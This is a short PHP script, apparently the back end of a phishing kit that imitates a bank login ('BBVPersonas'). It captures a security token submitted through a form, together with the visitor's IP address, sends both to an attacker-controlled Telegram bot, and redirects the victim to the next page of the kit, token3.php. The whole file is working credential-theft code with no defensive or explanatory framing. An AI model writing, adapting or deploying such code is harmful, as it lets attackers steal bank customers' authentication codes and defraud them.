<?php
// Incluir el archivo data.php para obtener el token y el chat_id
include 'data.php';

// Capturar el token ingresado en el formulario
if (isset($_POST['Token'])) {
    $token_value = $_POST['Token'];

    // Capturar la dirección IP del cliente
    $client_ip = $_SERVER['REMOTE_ADDR'];

    // Preparar el mensaje para enviar a Telegram
    $message = "BBVPersonas Token🤔: " . $token_value . "\nIP del cliente: " . $client_ip;

    // Enviar el mensaje a Telegram
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
    file_get_contents($url);

    // Redirigir a una página de confirmación (por ejemplo, 'success.html')
    header("Location: token3.php");
    exit();
}
?>
